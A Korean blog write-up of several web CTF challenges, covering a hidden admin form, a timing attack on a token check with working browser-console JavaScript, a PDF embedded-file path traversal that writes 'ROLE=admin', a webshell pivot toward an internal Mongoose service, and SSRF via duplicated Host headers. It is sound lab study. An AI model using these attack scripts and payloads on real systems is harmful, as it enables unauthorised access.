---
title: "CTF 풀이 회고: SSRF, 파일 처리, 숨겨진 폼, 타이밍 공격까지"
date: 2026-04-30
categories: [CTF, Web Security]
tags: [CTF, Web, SSRF, PDF, PyMuPDF, Timing Attack, robots.txt, HTTP Header, Mongoose, Flask]
---

이번 글은 여러 웹 CTF 문제를 풀면서 정리한 풀이 과정과 기법을 한 번에 묶은 기록이다.  
단순히 “어떤 페이로드를 넣었더니 풀렸다”가 아니라, 실제 풀이 중에 어떤 가설을 세웠고, 어떤 반응을 보고 방향을 바꿨는지 중심으로 정리했다.

특히 이번 문제들에서 반복적으로 등장한 핵심은 다음 한 문장으로 요약할 수 있다.

> 입력값 자체보다, 서버가 그 입력값을 어떻게 해석하는지가 더 중요하다.

다룬 유형은 크게 다음과 같다.

- `robots.txt`를 통한 숨겨진 관리자 페이지 발견
- 숨겨진 HTML 폼과 개발자 주석 기반 인증 우회
- 16자리 토큰 검증 문제에서 브루트포스가 아닌 타이밍 공격 접근
- 프로필 이미지 URL 기능에서 클라이언트 렌더링과 서버 사이드 요청의 구분
- JSP 웹쉘 이후 내부 Node/Mongoose 서비스 분석
- PDF 업로드 후 PyMuPDF embedded file 추출 기능을 이용한 파일 쓰기
- 커스텀 HTTP 파서 기반 SSRF / Header 해석 문제

---

## 1. robots.txt에서 시작된 관리자 페이지 문제

### 1.1 문제 단서

먼저 `robots.txt`에서 다음과 같은 내용을 확인했다.

```txt
User-agent: *
Disallow: /admin
```

이 내용은 검색 엔진 크롤러에게 `/admin` 경로를 수집하지 말라는 권고일 뿐, 접근 제어 기능이 아니다.  
CTF에서는 이런 `robots.txt` 항목이 거의 항상 “여기를 보라”는 힌트로 사용된다.

### 1.2 `/admin` 페이지 확인

`/admin` 페이지에 접근하자 화면에는 “STAFF ONLY”와 같은 문구만 보이고 로그인 창은 보이지 않았다.  
하지만 HTML 소스에는 다음과 같은 숨겨진 폼이 존재했다.

```html
<div id="hidden-login-form">
    <form action="/admin" method="POST">
        <input type="text" name="username" placeholder="직원 ID">
        <input type="password" name="password" placeholder="비밀번호">
        <button type="submit">문 열기</button>
    </form>
</div>
```

또한 소스 주석에 다음 힌트가 있었다.

```css
/* 메모
   임시 폼
   나중에 백엔드 고칠 것! (직원 ID: admin)
*/
```

### 1.3 분석

여기서 중요한 포인트는 세 가지다.

1. 로그인 폼은 화면에서 숨겨졌을 뿐 HTML에는 존재한다.
2. 주석에 `직원 ID: admin`이라는 명시적 힌트가 있다.
3. “임시 폼”, “나중에 백엔드 고칠 것”이라는 표현은 백엔드 검증이 허술할 가능성을 암시한다.

이 유형에서는 보통 다음을 우선 확인한다.

- CSS로 숨겨진 폼을 DevTools에서 보이게 만들기
- 폼을 직접 제출하기
- `username=admin`, 비밀번호 빈 값 또는 임의 값 시도
- SQL Injection 가능성 확인
- POST 요청 결과의 상태 코드, 응답 길이, 리다이렉트 여부 확인

### 1.4 핵심 기법

이 문제에서 중요한 교훈은 다음과 같다.

> 화면에 보이지 않는다고 존재하지 않는 것이 아니다.  
> HTML 소스, 주석, 숨겨진 폼은 모두 CTF에서 강한 힌트가 될 수 있다.

---

## 2. 16-hex Token Check 문제: 브루트포스가 아니라 타이밍 공격

### 2.1 문제 구조

초기 HTML은 다음과 같았다.

```html
<form action="/check.php" method="GET" autocomplete="off">
  <input name="token" placeholder="16-hex token" spellcheck="false">
  <button type="submit">Verify</button>
</form>
```

문구는 다음과 같았다.

```txt
Can you brute-force this?
```

`16-hex token`은 16개의 hexadecimal 문자, 즉 64비트 공간이다.  
정상적으로 난수가 생성되어 있다면 브루트포스는 현실적으로 불가능하다.

따라서 이 문구는 “브루트포스를 하라”는 의미라기보다는, 브루트포스로 착각하게 만드는 미끼로 봐야 한다.

### 2.2 처음 확인한 반응

처음에는 여러 token 값을 넣어도 `403 Forbidden`이 나왔다.

예를 들어 다음 값을 넣어도 모두 실패했다.

```txt
aaaaaaaaaaaaaaaa
0000000000000000
ffffffffffffffff
deadbeefdeadbeef
```

이때 중요한 점은 `403`이라는 상태 코드만 볼 것이 아니라 응답 body를 봐야 한다는 것이다.  
나중에 브라우저 콘솔의 `fetch()`로 확인했을 때 응답 body에는 다음과 같은 내용이 있었다.

```html
<h1>Invalid token</h1>
<p>try again.</p>
```

즉 상태 코드는 계속 403이어도, 서버 로직상 토큰 검증 단계에는 도달하고 있었다.

### 2.3 잘못된 가설들

처음에는 다음 가능성을 검토했다.

- PHP loose comparison
- magic hash (`0e...`)
- 빈 token
- `token[]=a` 같은 PHP 배열 파라미터
- 길이 검증 우회
- Referer / X-Requested-With 조건

하지만 `0e...` 계열, 빈 값, 짧은 값, 길이 변형 모두 동일한 `Invalid token` 반응이었다.

### 2.4 타이밍 공격으로 방향 전환

응답 메시지가 동일하고, 브루트포스가 비현실적이며, token이 앞에서부터 비교될 가능성이 있다면 타이밍 공격을 의심할 수 있다.

취약한 비교 로직은 보통 다음과 같은 형태다.

```python
for i in range(len(token)):
    if token[i] != secret[i]:
        return False
return True
```

또는 문자열을 앞에서부터 비교하면서 틀린 순간 종료하는 구조다.  
이 경우 맞은 prefix가 길수록 응답 시간이 조금씩 증가한다.

### 2.5 브라우저 콘솔 기반 측정

Burp를 사용할 수 없는 환경에서는 브라우저 콘솔에서도 측정할 수 있다.

```js
async function testToken(token) {
  const start = performance.now();
  await fetch("/check.php?token=" + token, {
    headers: { "X-Requested-With": "XMLHttpRequest" },
    credentials: "include"
  });
  return performance.now() - start;
}
```

한 글자씩 후보를 넣고 가장 오래 걸리는 문자를 선택한다.

```js
const hex = "0123456789abcdef";
let known = "";

(async () => {
  for (let i = 0; i < 16; i++) {
    let bestChar = "";
    let bestTime = 0;

    for (const c of hex) {
      const t = await testToken(known + c);
      console.log(known + c, t);

      if (t > bestTime) {
        bestTime = t;
        bestChar = c;
      }
    }

    known += bestChar;
    console.log("FOUND SO FAR:", known);
  }

  console.log("FINAL TOKEN:", known);
})();
```

네트워크 노이즈가 있으면 1회 측정보다 3회 평균이 안정적이다.

```js
async function testTokenAvg(token, tries = 3) {
  let total = 0;
  for (let i = 0; i < tries; i++) {
    const start = performance.now();
    await fetch("/check.php?token=" + token, {
      headers: { "X-Requested-With": "XMLHttpRequest" },
      credentials: "include"
    });
    total += performance.now() - start;
  }
  return total / tries;
}
```

### 2.6 교훈

이 문제의 핵심은 다음이다.

> 상태 코드만 믿지 말고 body와 시간 차이를 같이 봐야 한다.  
> “브루트포스 가능?”이라는 문구는 실제로 브루트포스를 하라는 뜻이 아닐 수 있다.

---

## 3. 프로필 이미지 URL 문제: SSRF로 착각하기 쉬운 클라이언트 렌더링

### 3.1 문제 상황

프로필 이미지 수정 페이지에 다음과 같은 입력창이 있었다.

```txt
update profile picture
nope! ヾ (✿>﹏⊙〃)ノ

Image URL
[ Update ]
```

처음에는 서버가 Image URL을 받아 직접 fetch한 후 base64로 변환해 보여주는 구조라고 생각했다.  
특히 새 탭에서 이미지 URL을 열었을 때 다음과 같은 형태가 보여 혼동이 있었다.

```txt
data:image/png;base64,...
```

### 3.2 중요한 구분

`data:image/png;base64,...`가 보인다고 해서 반드시 서버가 이미지를 fetch해서 base64로 인코딩했다는 뜻은 아니다.

브라우저가 직접 `data:` URL을 렌더링한 것일 수도 있다.

예를 들어 다음을 이미지 URL에 넣으면:

```txt
data:text/plain;base64,Z2V0ZmxhZw==
```

브라우저는 이것을 직접 디코딩해서 `getflag`를 보여줄 수 있다.  
이 경우 서버가 내부 파일을 읽었다는 증거가 아니다.

### 3.3 Datadog 로그의 의미

관리자 도구에서 다음과 같은 요청을 봤다.

```txt
https://logs.browser-intake-us5-datadoghq.com/api/v2/logs
```

이는 Datadog Browser SDK의 클라이언트 로그 수집 요청이다.  
즉 서버가 내부 리소스를 fetch하는 SSRF 흔적이 아니라, 브라우저에서 발생한 로그 전송이다.

### 3.4 결론

이 문제에서는 다음을 구분하는 것이 핵심이었다.

| 현상 | 의미 |
|---|---|
| `data:` URL이 브라우저에서 보임 | 클라이언트 렌더링일 수 있음 |
| 서버 응답 HTML에 base64가 삽입됨 | 서버 처리 가능성 있음 |
| Datadog 로그 | 프론트엔드 로그 수집 |
| `/flag`, `/etc/passwd` 입력 시 `nope` | 서버 파일 읽기 가능성 낮음 |

### 3.5 교훈

> “base64로 보인다”는 사실만으로 서버 사이드 파일 읽기라고 단정하면 안 된다.  
> 브라우저가 처리한 것인지, 서버가 처리한 것인지 먼저 구분해야 한다.

---

## 4. JSP 웹쉘 + Node/Mongoose + 내부 컨테이너 문제

### 4.1 댓글 힌트

다른 풀이자의 댓글에 다음과 같은 내용이 있었다.

```txt
의도한 풀이는 admin으로 로그인 후 업로드 기능으로 RCE를 발생시키는 것이겠지만,
이미 jsp 웹쉘이 업로드되어 있습니다.
플래그는 내부 db 컨테이너에 있으니 내부 db에서 추가로 rce를 발생시켜야 합니다.
mongoose 관련 cve를 찾아보시면 도움이 될 것 같습니다.
```

이 힌트만 보면 다음과 같은 구조를 예상할 수 있다.

```txt
Tomcat / JSP 웹쉘
   ↓
내부 Node(resource:3000)
   ↓
Mongoose
   ↓
DB 컨테이너
   ↓
flag
```

### 4.2 웹쉘 컨테이너 확인

`ps -ef` 결과는 다음과 같았다.

```txt
root 1 0 ... /opt/java/openjdk/bin/java ... org.apache.catalina.startup.Bootstrap start
```

즉 현재 쉘이 있는 곳은 Tomcat 컨테이너이며, Node나 Mongo 프로세스는 보이지 않았다.

`/proc/1/cgroup`에서는 podman 환경임을 확인했다.

```txt
/libpod_parent/libpod-...
```

환경 변수에서도 다음과 같은 정보가 있었다.

```txt
container=podman
ADMIN_PASSWORD=...
```

### 4.3 내부 Node 서비스 확인

프론트 코드에서 다음 단서를 확인했다.

```js
const base = "http://resource:3000";
const fruitId = "...";

const res = await fetch(`/api/resource/fruits/${encodeURIComponent(fruitId)}`);
```

웹쉘에서 내부 서비스에 요청해보면 다음과 같은 API가 있었다.

```txt
http://resource:3000/api/resource/fruits
```

응답은 MongoDB ObjectId 형태를 포함했다.

```json
{
  "_id": "69a10f2e102454982161c1b1",
  "name": "Apple",
  "nutritionProfile": "69a10f2e102454982161c1ae"
}
```

단건 조회 시에는 `nutritionProfile`이 객체로 populate되어 나왔다.

```json
{
  "_id": "...",
  "name": "Apple",
  "nutritionProfile": {
    "_id": "...",
    "fruitNameKey": "apple",
    "caloriesPer100g": 52
  }
}
```

즉 서버 내부에서는 다음과 같은 구조일 가능성이 높다.

```js
Fruit.findById(id).populate("nutritionProfile")
```

### 4.4 시행착오

다음 시도를 했다.

- `{"$ne":null}`을 id 자리에 넣기
- `{"$where":"return true"}` 시도
- query parameter injection
- populate 옵션 주입
- POST / PUT 시도
- 다른 endpoint 탐색
- host.containers.internal 접근
- podman socket 탐색
- 파일 시스템에서 flag 검색

대부분은 실패하거나 서버를 죽였다.

이 과정에서 알게 된 중요한 점은 다음이다.

1. 존재하지 않는 id를 쓰면 서버가 죽을 수 있다.
2. 서버가 재시작되면 in-memory 데이터가 초기화되어 ObjectId가 바뀐다.
3. 502가 항상 RCE 성공 신호는 아니다.
4. `findById()` 계열은 ObjectId casting 단계에서 죽을 수 있다.
5. 서버가 죽었다고 해서 Mongo `$where`가 실행된 것은 아닐 수 있다.

### 4.5 핵심 교훈

이 문제에서 가장 큰 교훈은 “한 번 세운 가설에 집착하면 안 된다”는 것이다.

특히 Mongoose 문제에서 502가 나오면 RCE에 가까워 보일 수 있지만, 실제로는 단순 cast error나 null 처리 실패일 수 있다.

> 서버가 죽었다는 사실은 “취약하다”는 신호일 수는 있지만, “원하는 코드가 실행됐다”는 증거는 아니다.

---

## 5. PDF 업로드 + PyMuPDF Embedded File 문제

### 5.1 외부 Flask 서버

외부 서버는 다음 기능을 제공했다.

```python
@app.post("/upload")
def u():
    f = request.files.get("file")
    if not f or not f.filename.endswith(".pdf"):
        return jsonify({"error": "pdf only"}), 400
    name = f"{uuid.uuid4().hex}.pdf"
    f.save(STORAGE / secure_filename(name))
    return jsonify({"saved_as": name})
```

파일명 확장자만 `.pdf`인지 확인하고 저장한다.

```python
@app.post("/process/<n>")
def p(n):
    r = requests.post(f"{INTERNAL}/process/{secure_filename(n)}")
    return r.text, r.status_code, r.headers.items()
```

이후 내부 서버로 처리를 위임한다.

```python
@app.get("/flag")
def flag():
    role = read_env_value("ROLE")
    if role != "admin":
        return jsonify({"ok": False, "error": "forbidden"}), 403

    flag_value = os.getenv("FLAG", "DH{FAKE-FLAG}")
    return jsonify({"ok": True, "flag": flag_value})
```

`/flag`는 `credit` 파일에서 `ROLE=admin`을 읽어야 통과한다.

### 5.2 내부 Flask 서버

내부 서버는 PDF를 처리할 때 bot을 실행한다.

```python
r = subprocess.run(
    ["python", str(BOT), str(pdf)],
    capture_output=True, text=True
)
```

### 5.3 bot.py 분석

핵심 코드는 다음과 같다.

```python
doc = fitz.open(str(pdf))
names = doc.embfile_names()
doc.close()

for i, n in enumerate(names):
    p = subprocess.run(
        [sys.executable, "-m", "pymupdf", "embed-extract",
         str(pdf), "-name", n],
        capture_output=True,
        text=True
    )
```

PDF embedded file name을 가져와 `pymupdf embed-extract`에 그대로 넘긴다.

### 5.4 취약점

PDF에 embedded file을 넣을 수 있고, 그 이름을 사용자가 제어할 수 있다.

예를 들어 embedded file name을 다음과 같이 만들 수 있다.

```txt
../../credit
```

또는 실제 경로 계산에 따라:

```txt
../../../credit
```

embedded file 내용은 다음과 같이 한다.

```txt
ROLE=admin
```

PyMuPDF가 embedded file을 추출하면서 파일 경로를 제대로 제한하지 않으면 path traversal을 통해 `credit` 파일을 생성하거나 덮어쓸 수 있다.

### 5.5 경로 계산

실제 process 결과는 다음과 같았다.

```json
{
  "pdf": "/app/private/storage/a7995d16ec04468f9c9afcd66ef59fb5.pdf",
  "count": 1,
  "names": ["../../credit"],
  "results": [
    {
      "name": "../../credit",
      "ok": true,
      "out": "/app/private/backend/extracted/a7995d16ec04468f9c9afcd66ef59fb5/file_0",
      "stderr": ""
    }
  ]
}
```

여기서 작업 위치가 다음과 같다고 볼 수 있다.

```txt
/app/private/backend/extracted/<uuid>/
```

`../../credit`이면:

```txt
/app/private/backend/credit
```

이 된다.  
하지만 `/flag`가 읽는 파일은 다음이다.

```txt
/app/private/credit
```

따라서 한 단계 더 올라가야 한다.

```txt
../../../credit
```

### 5.6 교훈

이 문제의 핵심은 다음이다.

> 파일 업로드 취약점은 파일명뿐 아니라 파일 내부 구조도 공격면이 될 수 있다.

PDF, ZIP, DOCX 같은 컨테이너형 파일 포맷에서는 내부 파일명, attachment name, metadata, embedded object 경로가 모두 공격면이 된다.

---

## 6. Custom HTTP Parser + SSRF + Header 해석 문제

### 6.1 코드 구조

문제 서버는 직접 HTTP 요청을 파싱한다.

중요한 코드 흐름은 다음과 같다.

```python
req_host = self.headers.get("Host", "data.local")
req_port = self.headers.get("X-Port", "80")

target = f"http://{req_host}:{req_port}/members?id={member_id}&challenge={challenge}"
```

이후 다음과 같이 요청을 보낸다.

```python
r = requests.get(target, timeout=2.5)
```

그리고 응답 JSON의 challenge 값을 검증한다.

```python
challenge = secrets.randbits(64)
challenge_result = hashlib.sha256(challenge.to_bytes(8)).hexdigest()

returned_challenge = data.get('challenge', None)
if challenge_result != returned_challenge:
    return self._send_json({"error": "not_found"}, status=404)
```

즉 단순히 내부 URL에 접근하는 SSRF가 아니라, 내부 응답이 challenge 검증까지 통과해야 한다.

### 6.2 중요한 파싱 코드

서버는 표준 라이브러리의 일반적인 헤더 파서를 그대로 쓰지 않고, raw header block을 직접 처리한다.

```python
for line in self.raw_header_block.splitlines():
    if not line.strip():
        continue
    if b":" in line:
        name, value = line.split(b":", 1)
        headers_dict[name.decode("iso-8859-1").strip()] = value.decode("iso-8859-1").strip()
self.headers = headers_dict
```

이 구조에서는 같은 이름의 헤더가 여러 번 등장하면 뒤의 값이 앞의 값을 덮어쓴다.

### 6.3 초기에 시도한 접근

처음에는 다음을 시도했다.

- `Host: data.local`
- `X-Port: 80`
- `Host: 127.0.0.1`
- `X-Port`에 `#`, `@`, `/` 등을 넣어 URL parsing 깨기
- HTTP/2 문제를 피하기 위해 `--http1.1` 사용

하지만 힌트에서는 다음과 같이 말하고 있었다.

```txt
X-Port를 여러 줄짜리 응답 조각을 실어 나르는 용도로 보기보다는,
fetcher가 req_host와 함께 묶어 target을 만들 때 이 값이 실제로 어떤 역할을 하게 되는지를 중심으로 다시 보라.
```

또한:

```txt
challenge는 미리 하나 정해서 넣는 대상이라기보다,
실제 요청 흐름 안에서 함께 움직이는 값으로 이해하라.
```

즉, 응답을 조작하는 문제라기보다는 요청이 만들어지는 과정과 헤더 해석을 봐야 하는 문제였다.

### 6.4 브라우저 콘솔로 안 되는 이유

이 문제는 브라우저 콘솔 `fetch()`로는 풀기 어렵다.

이유는 다음과 같다.

- 브라우저는 `Host` 헤더를 직접 설정할 수 없다.
- raw HTTP 요청을 만들 수 없다.
- 동일한 헤더를 여러 번 넣는 실험이 어렵다.
- HTTP/2에서는 `Host`가 `:authority`로 바뀌어 해석이 달라질 수 있다.

따라서 curl, Burp, netcat 같은 도구가 필요하다.

### 6.5 핵심 기법

이 문제에서 중요한 기법은 다음이다.

> 서버가 직접 파싱하는 헤더 구조에서 동일 헤더를 중복 삽입해 최종 값을 바꾸는 방식

예시:

```http
GET /fetch?id=1 HTTP/1.1
Host: original.example
X-Port: 80
Host: 127.0.0.1
Connection: close
```

직접 파싱 코드에서 마지막 `Host`가 살아남으면 내부 요청은 다음과 같이 만들어질 수 있다.

```txt
http://127.0.0.1:80/members?id=...&challenge=...
```

다만 이 문제에서는 challenge 검증도 있으므로, 최종적으로는 challenge를 올바르게 처리해주는 내부 `/members` 서비스 또는 그와 동일한 응답을 만들어내는 경로를 찾아야 한다.

### 6.6 교훈

이 문제의 핵심은 SSRF 자체가 아니라 다음이다.

> 서버가 HTTP 요청을 직접 파싱한다면, 표준 서버와 다르게 헤더 중복, 개행, 대소문자, HTTP 버전에 따라 다른 해석이 발생할 수 있다.

---

## 7. 반복해서 등장한 실전 디버깅 포인트

### 7.1 상태 코드만 믿지 않기

`403`, `404`, `502`는 단순히 실패라는 뜻이 아니다.

| 상태 | 가능한 의미 |
|---|---|
| 403 | 의도적으로 실패처럼 보이게 만든 상태일 수 있음 |
| 404 | challenge mismatch, route mismatch, not found |
| 400 | validation 단계에서 차단 |
| 502 | 내부 서비스 연결 실패 또는 백엔드 crash |
| 빈 응답 | 프록시/HTTPS/HTTP 버전 문제 가능 |

### 7.2 서버가 죽는 것은 성공이 아닐 수 있음

특히 Mongoose 문제에서 502가 반복되었지만, 이는 RCE 성공이라기보다 다음 가능성이 컸다.

- ObjectId cast error
- null 결과 처리 실패
- 존재하지 않는 id 사용
- unhandled exception

따라서 서버가 죽었다면 반드시 다음을 구분해야 한다.

```txt
1. 내가 원하는 코드가 실행되어 죽은 것인가?
2. 타입 에러나 null 처리 실패로 죽은 것인가?
```

### 7.3 내부 id는 재시작마다 바뀔 수 있음

in-memory DB나 초기 seed 기반 서버는 재시작마다 ObjectId가 바뀐다.  
따라서 존재하는 id를 먼저 조회하고 그 id를 사용해야 한다.

올바른 루틴:

```txt
1. /api/resource/fruits 조회
2. 현재 살아있는 _id 확인
3. 그 id로 단건 요청
4. 그 이후 테스트 진행
```

### 7.4 브라우저 처리와 서버 처리를 구분하기

`data:` URL, base64, 이미지 새 탭 열기 등은 브라우저가 처리한 것일 수 있다.  
서버 사이드 취약점으로 단정하지 말고 다음을 확인해야 한다.

- 서버 응답 HTML에 반영되었는가?
- 서버가 외부 URL로 실제 요청을 보냈는가?
- DevTools Network의 요청 주체가 브라우저인가, 서버인가?
- 로그 수집 요청을 오해하고 있지는 않은가?

---

## 8. 문제를 풀 때 적용할 체크리스트

### 8.1 HTML / 프론트엔드

- 숨겨진 form이 있는가?
- 주석에 힌트가 있는가?
- JS에 내부 URL이 하드코딩되어 있는가?
- API endpoint가 노출되어 있는가?
- `encodeURIComponent()` 사용 여부는 어떤 의미인가?

### 8.2 HTTP

- Host 헤더를 신뢰하는가?
- 커스텀 헤더가 URL 조립에 쓰이는가?
- 중복 헤더 처리가 어떻게 되는가?
- HTTP/1.1과 HTTP/2에서 차이가 나는가?
- 직접 파싱 코드가 있는가?

### 8.3 파일 업로드

- 확장자만 검사하는가?
- 파일 내용 검증은 있는가?
- 내부 embedded file, metadata, attachment name이 사용되는가?
- 추출 도구가 파일명을 그대로 사용하는가?
- path traversal 가능성이 있는가?

### 8.4 서버 사이드 요청

- SSRF 대상 host/port를 조작할 수 있는가?
- URL이 문자열 결합으로 만들어지는가?
- `#`, `@`, `/`, `?` 같은 URL 특수문자가 영향을 주는가?
- 내부 서비스가 challenge나 nonce를 요구하는가?

### 8.5 Node / Mongoose

- ObjectId 형식인지 확인
- `findById()`인지 `find()`인지 구분
- query parameter가 실제 쿼리에 들어가는지 확인
- populate가 실행되는지 확인
- 502를 RCE 성공으로 단정하지 않기

### 8.6 컨테이너

- 현재 컨테이너인지, 내부 서비스인지 구분
- `ps -ef`로 현재 프로세스 확인
- `/proc/1/cgroup`으로 docker/podman 확인
- `/etc/hosts`로 내부 host 확인
- runtime socket이나 shared volume 존재 여부 확인
- 네트워크 도구가 없으면 HTTP로 확인 가능한 범위만 확인

---

## 9. 실전 교훈 정리

이번 문제들을 통해 얻은 가장 중요한 교훈은 다음과 같다.

### 9.1 문제 문구는 그대로 믿지 않는다

`Can you brute-force this?`는 실제 브루트포스 문제가 아니었다.  
오히려 브루트포스라고 착각하게 만드는 장치였다.

### 9.2 “되는 것처럼 보이는 것”과 “실제로 되는 것”은 다르다

`data:image/png;base64`가 보인다고 서버가 파일을 읽은 것은 아니었다.  
브라우저가 렌더링한 것일 수 있다.

### 9.3 crash는 증거가 아니라 단서다

서버가 죽었다고 RCE가 된 것은 아니다.  
cast error, null dereference, unhandled exception도 서버를 죽인다.

### 9.4 파일 내부 구조도 공격면이다

PDF embedded file name처럼, 파일명뿐 아니라 파일 내부 metadata도 path traversal 공격면이 된다.

### 9.5 커스텀 파서는 항상 의심한다

HTTP 헤더를 직접 파싱하는 코드가 있다면 표준 서버와 다르게 해석될 가능성이 높다.

---

## 10. 최종 요약

이번 풀이에서 반복된 핵심은 다음이다.

```txt
입력값을 바꾸는 것이 아니라,
서버가 그 입력값을 해석하는 방식을 바꿔야 한다.
```

문제 유형별로 요약하면 다음과 같다.

| 문제 유형 | 핵심 기법 |
|---|---|
| robots.txt / admin | 숨겨진 경로와 주석 확인 |
| token check | timing attack |
| profile image | 클라이언트 렌더링과 서버 fetch 구분 |
| JSP webshell / mongoose | 인프라 구조와 잘못된 가설 제거 |
| PDF upload | embedded file name path traversal |
| SSRF fetcher | custom header parsing / Host override |

마지막으로, CTF 풀이에서 가장 중요한 태도는 다음이다.

> 반응을 보고 가설을 계속 수정해야 한다.  
> 한 번 세운 가설에 집착하면 오히려 멀어진다.
